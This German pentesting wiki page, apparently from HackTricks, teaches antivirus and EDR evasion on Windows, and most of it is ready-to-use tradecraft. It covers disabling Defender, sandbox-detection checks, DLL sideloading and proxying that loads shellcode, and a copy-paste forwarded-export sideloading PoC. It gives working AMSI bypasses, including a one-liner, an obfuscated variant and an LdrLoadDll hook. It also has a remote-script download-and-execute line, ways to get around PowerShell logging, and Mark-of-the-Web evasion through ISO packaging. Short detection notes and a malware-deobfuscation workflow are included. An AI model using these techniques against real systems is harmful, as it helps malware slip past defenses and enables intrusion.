# Antivirus (AV) Umgehung

{{#include ../banners/hacktricks-training.md}}

**Diese Seite wurde geschrieben von** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Defender stoppen

- [defendnot](https://github.com/es3n1n/defendnot): Ein Tool, um Windows Defender außer Funktion zu setzen.
- [no-defender](https://github.com/es3n1n/no-defender): Ein Tool, das Windows Defender durch Vortäuschen eines anderen AV außer Betrieb setzt.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

## **AV Evasion Methodik**

Derzeit nutzen AVs verschiedene Methoden, um zu prüfen, ob eine Datei bösartig ist oder nicht: static detection, dynamic analysis und für fortgeschrittene EDRs behavioural analysis.

### **Static detection**

Static detection wird erreicht, indem bekannte bösartige Strings oder Bytefolgen in einer Binärdatei oder einem Skript markiert werden, und indem Informationen aus der Datei selbst extrahiert werden (z. B. file description, company name, digital signatures, icon, checksum usw.). Das bedeutet, dass die Verwendung bekannter öffentlicher Tools dich leichter auffliegen lässt, da diese wahrscheinlich bereits analysiert und als bösartig markiert wurden. Es gibt ein paar Wege, um diese Art der Erkennung zu umgehen:

- **Encryption**

Wenn du die Binärdatei verschlüsselst, kann der AV dein Programm nicht erkennen, aber du brauchst einen Loader, um das Programm im Speicher zu entschlüsseln und auszuführen.

- **Obfuscation**

Manchmal reicht es, einige Strings in deiner Binärdatei oder deinem Skript zu ändern, um an AV vorbei zu kommen, aber das kann je nach Umfang der gewünschten Verschleierung zeitaufwändig sein.

- **Custom tooling**

Wenn du eigene Tools entwickelst, gibt es keine bekannten schlechten Signaturen, allerdings kostet das viel Zeit und Aufwand.

> [!TIP]
> Eine gute Methode, um gegen Windows Defender static detection zu prüfen, ist [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Es teilt die Datei im Grunde in mehrere Segmente und lässt Defender jedes einzeln scannen; so kann es dir genau sagen, welche Strings oder Bytes in deiner Binärdatei markiert sind.

Ich empfehle dringend, dir diese [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) über praktische AV Evasion anzusehen.

### **Dynamic analysis**

Dynamic analysis bedeutet, dass der AV deine Binärdatei in einer Sandbox ausführt und nach bösartiger Aktivität sucht (z. B. versuchen, die Browser-Passwörter zu entschlüsseln und zu lesen, einen Minidump von LSASS anzufertigen usw.). Dieser Teil kann etwas kniffliger sein, aber hier sind einige Dinge, die du tun kannst, um Sandboxes zu umgehen.

- **Sleep before execution** Je nachdem, wie es implementiert ist, kann das eine gute Methode sein, die dynamic analysis von AVs zu umgehen. AVs haben nur sehr wenig Zeit, Dateien zu scannen, um den Arbeitsablauf des Nutzers nicht zu unterbrechen, daher können lange Sleeps die Analyse stören. Das Problem ist, dass viele AV-Sandboxes den Sleep je nach Implementierung einfach überspringen können.
- **Checking machine's resources** Normalerweise haben Sandboxes sehr geringe Ressourcen (< 2GB RAM), sonst würden sie den Rechner des Nutzers verlangsamen. Du kannst hier auch kreativ werden, z. B. indem du die CPU-Temperatur oder sogar die Lüftergeschwindigkeit prüfst — nicht alles ist in der Sandbox implementiert.
- **Machine-specific checks** Wenn du einen Nutzer anvisierst, dessen Workstation der Domain "contoso.local" angehört, kannst du die Domain des Computers überprüfen; wenn sie nicht übereinstimmt, kann dein Programm beendet werden.

Es stellt sich heraus, dass der Computername der Microsoft Defender Sandbox HAL9TH ist. Du kannst also den Computernamen in deiner Malware vor der Detonation prüfen; wenn der Name HAL9TH ist, befindest du dich in der Defender-Sandbox und kannst dein Programm beenden.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>Quelle: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Einige weitere sehr gute Tipps von [@mgeeky](https://twitter.com/mariuszbit) im Kampf gegen Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Wie bereits erwähnt, werden **öffentliche Tools** früher oder später **entdeckt**, also solltest du dir folgende Frage stellen:

Wenn du z. B. LSASS dumpen willst, **musst du wirklich mimikatz verwenden**? Oder könntest du ein weniger bekanntes Projekt nutzen, das ebenfalls LSASS dumpen kann?

Die richtige Antwort ist wahrscheinlich Letzteres. Mimikatz ist eines der — wenn nicht das — am stärksten von AVs und EDRs markierten Tools; obwohl das Projekt an sich super ist, ist es eine Tortur, damit AVs zu umgehen. Suche also nach Alternativen für dein Ziel.

> [!TIP]
> Wenn du deine Payloads zur Evasion veränderst, stelle sicher, dass du die automatische Sample-Einreichung in Defender deaktivierst, und bitte, wirklich, LADEN SIE NICHT AUF VIRUSTOTAL HOCH, wenn dein Ziel langfristige Evasion ist. Wenn du testen willst, ob eine bestimmte AV deine Payload erkennt, installiere sie in einer VM, versuche die automatische Sample-Einreichung zu deaktivieren und teste dort, bis du mit dem Ergebnis zufrieden bist.

## EXEs vs DLLs

Wann immer möglich, priorisiere **DLLs für Evasion**. Nach meiner Erfahrung werden DLL-Dateien in der Regel **viel seltener erkannt** und analysiert, daher ist dies ein einfacher Trick, um in manchen Fällen die Erkennung zu vermeiden (vorausgesetzt, deine Payload kann als DLL ausgeführt werden).

Wie in diesem Bild zu sehen ist, hat eine DLL-Payload von Havoc eine Erkennungsrate von 4/26 auf antiscan.me, während die EXE-Payload eine 7/26-Erkennungsrate hat.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me Vergleich einer normalen Havoc EXE-Payload vs einer normalen Havoc DLL</p></figcaption></figure>

Nun zeigen wir einige Tricks, die du mit DLL-Dateien verwenden kannst, um viel stealthier zu sein.

## DLL Sideloading & Proxying

**DLL Sideloading** nutzt die DLL-Suchreihenfolge des Loaders aus, indem die Opferanwendung und die bösartigen Payload(s) nebeneinander positioniert werden.

Du kannst Programme auf Anfälligkeit für DLL Sideloading prüfen, indem du [Siofra](https://github.com/Cybereason/siofra) und das folgende powershell-Skript verwendest:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Dieser Befehl gibt die Liste der Programme aus, die für DLL hijacking anfällig sind, innerhalb von "C:\Program Files\\" und die DLL-Dateien, die sie zu laden versuchen.

Ich empfehle dringend, dass du **DLL Hijackable/Sideloadable programs selbst untersuchst**; diese Technik ist bei richtiger Ausführung ziemlich unauffällig, aber wenn du öffentlich bekannte DLL Sideloadable programs verwendest, kannst du leicht erwischt werden.

Allein dadurch, eine bösartige DLL mit dem von einem Programm erwarteten Namen abzulegen, lädt das Programm nicht unbedingt dein Payload, da das Programm bestimmte Funktionen in dieser DLL erwartet; um dieses Problem zu beheben, verwenden wir eine weitere Technik namens **DLL Proxying/Forwarding**.

**DLL Proxying** leitet die Aufrufe, die ein Programm an die Proxy-(und bösartige) DLL macht, an die originale DLL weiter, dadurch bleibt die Funktionalität des Programms erhalten und gleichzeitig kann die Ausführung deines Payloads gehandhabt werden.

Ich werde das Projekt [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) von [@flangvik](https://twitter.com/Flangvik/) verwenden.

Dies sind die Schritte, die ich befolgt habe:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Der letzte Befehl liefert uns 2 Dateien: eine DLL source code template und die ursprünglich umbenannte DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Das sind die Ergebnisse:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Unser Shellcode (kodiert mit [SGN](https://github.com/EgeBalci/sgn)) und die Proxy-DLL haben auf [antiscan.me](https://antiscan.me) eine Erkennungsrate von 0/26! Ich würde das als Erfolg bezeichnen.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ich **empfehle dringend**, dass du dir [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) über DLL Sideloading ansiehst und auch [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE), um das, was wir besprochen haben, ausführlicher zu verstehen.

### Missbrauch weitergeleiteter Exports (ForwardSideLoading)

Windows PE-Module können Funktionen exportieren, die tatsächlich "forwarders" sind: anstatt auf Code zu zeigen, enthält der Exporteintrag eine ASCII-Zeichenkette der Form `TargetDll.TargetFunc`. Wenn ein Aufrufer den Export auflöst, wird der Windows-Loader:

- `TargetDll` laden, falls nicht bereits geladen
- `TargetFunc` daraus auflösen

Wichtige Verhaltensweisen:
- Wenn `TargetDll` eine KnownDLL ist, wird sie aus dem geschützten KnownDLLs-Namespace bereitgestellt (z. B. ntdll, kernelbase, ole32).
- Wenn `TargetDll` keine KnownDLL ist, wird die normale DLL-Suchreihenfolge verwendet, die auch das Verzeichnis des Moduls einschließt, das die Weiterleitung auflöst.

Dies ermöglicht ein indirektes sideloading-Primitive: finde eine signierte DLL, die eine Funktion exportiert, die an einen Modulnamen weitergeleitet wird, der keine KnownDLL ist, und platziere diese signierte DLL zusammen mit einer von einem Angreifer kontrollierten DLL mit genau dem Namen des weitergeleiteten Zielmoduls im selben Verzeichnis. Wenn der weitergeleitete Export aufgerufen wird, löst der Loader die Weiterleitung auf und lädt deine DLL aus demselben Verzeichnis und führt deine DllMain aus.

Beispiel beobachtet auf Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` ist kein KnownDLL, daher wird es über die normale Suchreihenfolge aufgelöst.

PoC (copy-paste):
1) Kopiere die signierte System-DLL in einen beschreibbaren Ordner
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Lege eine bösartige `NCRYPTPROV.dll` in denselben Ordner. Ein minimales DllMain genügt, um Codeausführung zu erlangen; die weitergeleitete Funktion muss nicht implementiert werden, um DllMain auszulösen.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Die Weiterleitung mit einem signierten LOLBin auslösen:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Beobachtetes Verhalten:
- rundll32 (signed) lädt das side-by-side `keyiso.dll` (signed)
- Beim Auflösen von `KeyIsoSetAuditingInterface` folgt der Loader der Weiterleitung zu `NCRYPTPROV.SetAuditingInterface`
- Der Loader lädt dann `NCRYPTPROV.dll` aus `C:\test` und führt dessen `DllMain` aus
- Wenn `SetAuditingInterface` nicht implementiert ist, erhältst du erst nach Ausführung von `DllMain` einen "missing API"-Fehler

Hinweise zur Suche:
- Konzentriere dich auf weitergeleitete Exporte, bei denen das Zielmodul kein KnownDLL ist. KnownDLLs sind aufgeführt unter `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Du kannst weitergeleitete Exporte mit Tools wie zum Beispiel aufzählen:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Siehe das Windows 11 Forwarder-Inventar, um nach Kandidaten zu suchen: https://hexacorn.com/d/apis_fwd.txt

Detection/defense ideas:
- Überwache LOLBins (z. B. rundll32.exe), die signierte DLLs aus Nicht-Systempfaden laden, gefolgt vom Laden non-KnownDLLs mit demselben Basisnamen aus diesem Verzeichnis
- Alarm bei Prozess-/Modulketten wie: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` in benutzerschreibbaren Pfaden
- Erzwinge Code-Integrity-Richtlinien (WDAC/AppLocker) und verweigere Schreib- und Ausführungsrechte in Anwendungsverzeichnissen

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Sie können Freeze verwenden, um Ihren shellcode unauffällig zu laden und auszuführen.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion ist nur ein Katz-und-Maus-Spiel: Was heute funktioniert, kann morgen erkannt werden. Verlasse dich niemals ausschließlich auf ein Werkzeug — wenn möglich, kombiniere mehrere Evasionstechniken.

## AMSI (Anti-Malware Scan Interface)

AMSI wurde geschaffen, um "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)" zu verhindern. Anfangs konnten AVs nur **Dateien auf der Festplatte** scannen, sodass man, wenn man Payloads **direkt im Speicher** ausführen konnte, der AV nichts entgegensetzen konnte, da er nicht genug Sichtbarkeit hatte.

Die AMSI-Funktion ist in folgende Windows-Komponenten integriert:

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

Es ermöglicht Antiviren-Lösungen, das Verhalten von Skripten zu inspizieren, indem Skriptinhalte in einer unverschlüsselten und nicht obfuskierten Form offengelegt werden.

Das Ausführen von `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` erzeugt die folgende Meldung in Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Beachte, wie es `amsi:` voranstellt und dann den Pfad zur ausführbaren Datei angibt, von der das Skript ausgeführt wurde — in diesem Fall powershell.exe

Wir haben keine Datei auf die Festplatte geschrieben, wurden aber trotzdem aufgrund von AMSI im Speicher entdeckt.

Außerdem wird ab **.NET 4.8** auch C#-Code durch AMSI verarbeitet. Das betrifft sogar `Assembly.Load(byte[])` für in-memory-Ausführung. Deshalb wird empfohlen, für in-memory-Ausführung ältere .NET-Versionen (z. B. 4.7.2 oder älter) zu verwenden, wenn man AMSI umgehen möchte.

Es gibt mehrere Möglichkeiten, AMSI zu umgehen:

- **Obfuscation**

Da AMSI hauptsächlich mit statischen Erkennungen arbeitet, kann das Modifizieren der Skripte, die man laden möchte, eine gute Methode sein, um eine Erkennung zu umgehen.

Allerdings ist AMSI in der Lage, Skripte zu deobfuskieren, selbst wenn mehrere Obfuskationsschichten vorhanden sind, sodass Obfuscation je nach Ausführung eine schlechte Option sein kann. Das macht die Umgehung nicht unbedingt trivial. Manchmal reicht aber auch schon, ein paar Variablennamen zu ändern, sodass es darauf ankommt, wie stark etwas markiert wurde.

- **AMSI Bypass**

Da AMSI durch das Laden einer DLL in den powershell- (sowie cscript.exe-, wscript.exe- usw.) Prozess implementiert ist, lässt es sich selbst als nicht privilegierter Benutzer relativ einfach manipulieren. Aufgrund dieses Implementierungsfehlers haben Forscher mehrere Wege gefunden, AMSI-Scans zu umgehen.

**Forcing an Error**

Wenn die AMSI-Initialisierung absichtlich fehlschlägt (amsiInitFailed), wird für den aktuellen Prozess kein Scan gestartet. Ursprünglich wurde dies von [Matt Graeber](https://twitter.com/mattifestation) offengelegt, und Microsoft hat eine Signatur entwickelt, um eine breitere Nutzung zu verhindern.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Es genügte eine einzige Zeile powershell-Code, um AMSI für den aktuellen powershell-Prozess unbrauchbar zu machen. Diese Zeile wurde natürlich von AMSI selbst erkannt, daher sind einige Änderungen nötig, um diese Technik nutzen zu können.

Hier ist ein modifizierter AMSI bypass, den ich aus diesem [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) übernommen habe.
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Beachte, dass dies wahrscheinlich auffallen wird, sobald dieser Beitrag veröffentlicht wird, daher solltest du keinen Code veröffentlichen, wenn dein Plan ist, unentdeckt zu bleiben.

**Memory Patching**

Diese Technik wurde ursprünglich von [@RastaMouse](https://twitter.com/_RastaMouse/) entdeckt und besteht darin, die Adresse der Funktion "AmsiScanBuffer" in amsi.dll (verantwortlich für das Scannen der vom Benutzer gelieferten Eingabe) zu finden und sie mit Instruktionen zu überschreiben, die den Rückgabecode E_INVALIDARG liefern. Auf diese Weise gibt der eigentliche Scan 0 zurück, was als sauberer Befund interpretiert wird.

> [!TIP]
> Bitte lies [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) für eine ausführlichere Erklärung.

Es gibt außerdem viele weitere Techniken, um AMSI mit powershell zu umgehen — siehe [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) und [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell), um mehr darüber zu erfahren.

### Blocking AMSI by preventing amsi.dll load (LdrLoadDll hook)

AMSI wird erst initialisiert, nachdem `amsi.dll` in den aktuellen Prozess geladen wurde. Ein robuster, sprachunabhängiger Bypass besteht darin, einen user‑mode hook auf `ntdll!LdrLoadDll` zu setzen, der einen Fehler zurückgibt, wenn das angeforderte Modul `amsi.dll` ist. Dadurch lädt AMSI nie und es finden für diesen Prozess keine Scans statt.

Implementierungsübersicht (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Hinweise
- Funktioniert sowohl mit PowerShell, WScript/CScript als auch mit benutzerdefinierten Loadern (alles, was sonst AMSI laden würde).
- Kombiniere dies mit dem Einspeisen von Skripten über stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`), um lange Kommandozeilen‑Artefakte zu vermeiden.
- Wird bei Loadern verwendet, die über LOLBins ausgeführt werden (z. B. `regsvr32`, das `DllRegisterServer` aufruft).

Dieses Tool [https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail) generiert außerdem Skripte, um AMSI zu umgehen.

**Erkannte Signatur entfernen**

Du kannst Tools wie **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** und **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** verwenden, um die erkannte AMSI-Signatur aus dem Speicher des aktuellen Prozesses zu entfernen. Dieses Tool funktioniert, indem es den Speicher des aktuellen Prozesses nach der AMSI-Signatur durchsucht und diese dann mit NOP-Instruktionen überschreibt, wodurch sie effektiv aus dem Speicher entfernt wird.

**AV/EDR-Produkte, die AMSI verwenden**

Eine Liste von AV/EDR-Produkten, die AMSI verwenden, findest du in **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**PowerShell Version 2 verwenden**
Wenn du PowerShell Version 2 benutzt, wird AMSI nicht geladen, sodass du deine Skripte ausführen kannst, ohne von AMSI gescannt zu werden. Du kannst dies so tun:
```bash
powershell.exe -version 2
```
## PS-Protokollierung

PowerShell-Logging ist eine Funktion, mit der alle auf einem System ausgeführten PowerShell-Befehle protokolliert werden können. Das ist nützlich für Auditing und Fehlerbehebung, kann aber auch ein **Problem für Angreifer darstellen, die eine Erkennung umgehen wollen**.

Um PowerShell-Logging zu umgehen, können Sie die folgenden Techniken verwenden:

- **Disable PowerShell Transcription and Module Logging**: Sie können ein Tool wie [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) für diesen Zweck verwenden.
- **Use Powershell version 2**: Wenn Sie PowerShell Version 2 verwenden, wird AMSI nicht geladen, sodass Sie Ihre Skripte ausführen können, ohne von AMSI gescannt zu werden. Dazu: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Verwenden Sie [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell), um eine PowerShell-Session ohne Verteidigungen zu starten (das ist das, was `powerpick` von Cobal Strike verwendet).


## Obfuskation

> [!TIP]
> Mehrere Obfuskationstechniken basieren auf der Verschlüsselung von Daten, was die Entropie der Binärdatei erhöht und AVs/EDRs die Erkennung erleichtert. Seien Sie vorsichtig damit und verschlüsseln Sie gegebenenfalls nur bestimmte Abschnitte Ihres Codes, die sensibel sind oder verborgen werden müssen.

### Deobfuskation von ConfuserEx-geschützten .NET-Binärdateien

Bei der Analyse von Malware, die ConfuserEx 2 (oder kommerzielle Forks) verwendet, trifft man häufig auf mehrere Schutzschichten, die Decompiler und Sandboxes blockieren. Der untenstehende Workflow stellt zuverlässig eine nahezu originale IL wieder her, die anschließend mit Tools wie dnSpy oder ILSpy nach C# dekompiliert werden kann.

1.  Anti-Tampering-Entfernung – ConfuserEx verschlüsselt jeden *method body* und entschlüsselt ihn im *module* static constructor (`<Module>.cctor`). Das patcht außerdem die PE-Checksumme, sodass jede Modifikation die Binärdatei zum Absturz bringen kann. Verwenden Sie **AntiTamperKiller**, um die verschlüsselten Metadatentabellen zu finden, die XOR-Schlüssel wiederherzustellen und eine saubere Assembly zu schreiben:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Die Ausgabe enthält die 6 Anti-Tamper-Parameter (`key0-key3`, `nameHash`, `internKey`), die beim Erstellen eines eigenen Unpackers nützlich sein können.

2.  Symbol- / Kontrollfluss-Wiederherstellung – geben Sie die *clean*-Datei an **de4dot-cex** (ein ConfuserEx-bewusster Fork von de4dot).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – select the ConfuserEx 2 profile  
• de4dot wird Control-Flow-Flattening rückgängig machen, originale Namespaces, Klassen und Variablennamen wiederherstellen und konstante Strings entschlüsseln.

3.  Proxy-Call-Entfernung – ConfuserEx ersetzt direkte Methodenaufrufe durch leichte Wrapper (a.k.a *proxy calls*), um die Dekompilierung weiter zu erschweren. Entfernen Sie diese mit **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Nach diesem Schritt sollten Sie normale .NET-APIs wie `Convert.FromBase64String` oder `AES.Create()` sehen, statt undurchsichtiger Wrapper-Funktionen (`Class8.smethod_10`, …).

4.  Manuelle Nachbearbeitung – führen Sie die resultierende Binärdatei unter dnSpy aus, suchen Sie nach großen Base64-Blobs oder nach Verwendung von `RijndaelManaged`/`TripleDESCryptoServiceProvider`, um das *real* payload zu lokalisieren. Oft speichert die Malware es als TLV-kodiertes Byte-Array, das innerhalb von `<Module>.byte_0` initialisiert ist.

Die obige Kette stellt den Ausführungsfluss **wieder her, ohne** die bösartige Probe ausführen zu müssen – nützlich, wenn man an einem Offline-Arbeitsplatz arbeitet.

> 🛈  ConfuserEx erzeugt ein benutzerdefiniertes Attribut namens `ConfusedByAttribute`, das als IOC verwendet werden kann, um Samples automatisch zu triagieren.

#### Einzeiler
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Ziel dieses Projekts ist es, einen Open-Source-Fork der [LLVM](http://www.llvm.org/) Compiler-Suite bereitzustellen, der erhöhte Softwaresicherheit durch [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) und tamper-proofing bietet.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstriert, wie man die Sprache `C++11/14` verwendet, um zur Kompilierzeit obfuscated code zu erzeugen, ohne ein externes Tool zu verwenden und ohne den Compiler zu verändern.
- [**obfy**](https://github.com/fritzone/obfy): Fügt eine Schicht von obfuscated operations hinzu, die vom C++ template metaprogramming framework erzeugt werden und das Leben der Person, die versucht, die Anwendung zu knacken, etwas erschweren.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz ist ein x64 binary obfuscator, der in der Lage ist, verschiedene pe files zu obfuscaten, einschließlich: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame ist eine einfache metamorphic code engine für beliebige Executables.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator ist ein fein granular aufgebautes code obfuscation framework für LLVM-unterstützte Sprachen, das ROP (return-oriented programming) verwendet. ROPfuscator obfuscates ein Programm auf Assembly-Ebene, indem reguläre Instruktionen in ROP chains umgewandelt werden, wodurch unsere normale Vorstellung von Kontrollfluss durchbrochen wird.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt ist ein .NET PE Crypter, geschrieben in Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor kann bestehende EXE/DLL in Shellcode konvertieren und diese dann laden

## SmartScreen & MoTW

You may have seen this screen when downloading some executables from the internet and executing them.

Microsoft Defender SmartScreen is a security mechanism intended to protect the end user against running potentially malicious applications.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen mainly works with a reputation-based approach, meaning that uncommonly download applications will trigger SmartScreen thus alerting and preventing the end user from executing the file (although the file can still be executed by clicking More Info -> Run anyway).

**MoTW** (Mark of The Web) is an [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) with the name of Zone.Identifier which is automatically created upon download files from the internet, along with the URL it was downloaded from.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Überprüfung des Zone.Identifier ADS für eine aus dem Internet heruntergeladene Datei.</p></figcaption></figure>

> [!TIP]
> Es ist wichtig zu beachten, dass ausführbare Dateien, die mit einem **vertrauenswürdigen** Signaturzertifikat signiert sind, **SmartScreen nicht auslösen**.

A very effective way to prevent your payloads from getting the Mark of The Web is by packaging them inside some sort of container like an ISO. This happens because Mark-of-the-Web (MOTW) **nicht** auf **Nicht-NTFS** volumes angewendet werden kann.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) is a tool that packages payloads into output containers to evade Mark-of-the-Web.

Beispiel:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

